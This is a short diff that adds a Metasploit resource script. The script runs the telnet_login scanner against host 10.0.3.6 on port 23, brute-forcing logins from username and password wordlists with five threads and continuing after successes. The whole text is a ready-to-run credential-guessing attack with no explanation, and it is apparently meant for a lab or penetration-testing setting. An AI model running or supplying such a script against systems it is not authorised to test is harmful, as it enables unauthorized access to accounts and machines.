@@ -1,0 +1,10 @@
+use auxiliary/scanner/telnet/telnet_login
+set RHOSTS 10.0.3.6
+set RPORT 23
+set USER_FILE /home/salma/users.txt
+set PASS_FILE /home/salma/passwords.txt
+set STOP_ON_SUCCESS false
+set VERBOSE true
+set THREADS 5
+exploit
+exit
